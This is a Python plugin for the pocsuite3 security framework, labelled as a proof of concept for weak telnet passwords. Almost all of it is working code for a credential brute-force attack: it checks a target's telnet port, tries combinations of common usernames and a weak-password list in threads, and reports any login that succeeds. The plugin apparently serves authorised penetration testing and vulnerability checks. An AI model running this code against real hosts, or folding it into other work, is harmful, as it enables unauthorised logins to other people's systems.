"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import itertools
import queue
import socket
import telnetlib

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.threads import run_threads


class DemoPOC(POCBase):
    vulID = '89687'
    version = '3'
    author = ['seebug']
    vulDate = '2018-09-19'
    createDate = '2018-09-19'
    updateDate = '2018-09-19'
    references = ['https://www.seebug.org/vuldb/ssvid-89687']
    name = 'Telnet 弱密码'
    appPowerLink = ''
    appName = 'telnet'
    appVersion = 'All'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''telnet 存在弱密码，导致攻击者可登录主机进行恶意操作'''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.TELENT

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 23

        telnet_burst(host, port)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    common_username = ('Administrator', 'administrator', 'telnet',
                       'test', 'root', 'guest', 'admin', 'daemon', 'user')
    with open(paths.WEAK_PASS) as f:
        return itertools.product(common_username, f)


def port_check(host, port=23):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
        return False


def telnet_login(host, port, username, password):
    ret = False
    key = [b'>', b'Login', b'login']
    tn = None
    try:
        for wrap in [b'\n', b'\r\n']:
            tn = telnetlib.Telnet()
            tn.open(host, port, timeout=6)
            tn.read_until(b'login: ', timeout=3)
            tn.write(username.encode() + wrap)
            if password:
                tn.read_until(b'password: ', timeout=3)
                tn.write(password.encode() + wrap)
            tmp = tn.expect(key, timeout=3)
            if b'>' in tmp[2]:
                ret = True
                break
    except Exception:
        pass
    finally:
        if tn:
            tn.close()
    return ret


def task_init(host, port):
    tmp = set()
    for username, password in get_word_list():
        if username not in tmp:
            task_queue.put((host, port, username.strip(), ''))
            tmp.add(username)
        task_queue.put((host, port, username.strip(), password.strip()))


def task_thread():
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, username, password))
        if telnet_login(host, port, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))


def telnet_burst(host, port):
    if not port_check(host, port):
        return

    try:
        task_init(host, port)
        run_threads(1, task_thread)
    except Exception:
        pass


register_poc(DemoPOC)
